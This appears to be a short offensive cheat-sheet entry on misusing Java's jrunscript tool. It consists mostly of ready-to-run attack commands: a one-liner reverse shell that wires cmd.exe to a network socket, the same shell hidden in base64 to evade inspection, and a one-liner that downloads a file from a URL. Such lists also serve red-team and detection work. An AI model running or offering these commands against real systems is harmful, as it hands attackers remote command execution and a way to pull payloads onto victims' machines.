# JRunScript

## Reverse Shell

One-liner reverse shell.

```
$ jrunscript -e 'var host="localhost"; var port=8044; var cmd="cmd.exe"; var p=new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();var s=new java.net.Socket(host,port);var pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();java.lang.Thread.sleep(50);try {p.exitValue();break;}catch (e){}};p.destroy();s.close();'
```

Base64 encoded one-liner reverse shell.

```
$ jrunscript -e 'eval(new java.lang.String(javax.xml.bind.DatatypeConverter.parseBase64Binary("dmFyIGhvc3Q9ImxvY2FsaG9zdCI7IHZhciBwb3J0PTgwNDQ7IHZhciBjbWQ9ImNtZC5leGUiOyB2YXIgcD1uZXcgamF2YS5sYW5nLlByb2Nlc3NCdWlsZGVyKGNtZCkucmVkaXJlY3RFcnJvclN0cmVhbSh0cnVlKS5zdGFydCgpO3ZhciBzPW5ldyBqYXZhLm5ldC5Tb2NrZXQoaG9zdCxwb3J0KTt2YXIgcGk9cC5nZXRJbnB1dFN0cmVhbSgpLHBlPXAuZ2V0RXJyb3JTdHJlYW0oKSwgc2k9cy5nZXRJbnB1dFN0cmVhbSgpO3ZhciBwbz1wLmdldE91dHB1dFN0cmVhbSgpLHNvPXMuZ2V0T3V0cHV0U3RyZWFtKCk7d2hpbGUoIXMuaXNDbG9zZWQoKSl7d2hpbGUocGkuYXZhaWxhYmxlKCk+MClzby53cml0ZShwaS5yZWFkKCkpO3doaWxlKHBlLmF2YWlsYWJsZSgpPjApc28ud3JpdGUocGUucmVhZCgpKTt3aGlsZShzaS5hdmFpbGFibGUoKT4wKXBvLndyaXRlKHNpLnJlYWQoKSk7c28uZmx1c2goKTtwby5mbHVzaCgpO2phdmEubGFuZy5UaHJlYWQuc2xlZXAoNTApO3RyeSB7cC5leGl0VmFsdWUoKTticmVhazt9Y2F0Y2ggKGUpe319O3AuZGVzdHJveSgpO3MuY2xvc2UoKTsK")));'
```

## HTTP Download

```
$ jrunscript -e 'var url = "https://google.com"; var file = "somefile"; var rbc = java.nio.channels.Channels.newChannel(new URL(url).openStream()); var fos = new FileOutputStream(file); fos.getChannel().transferFrom(rbc, 0, java.lang.Long.MAX_VALUE)'
```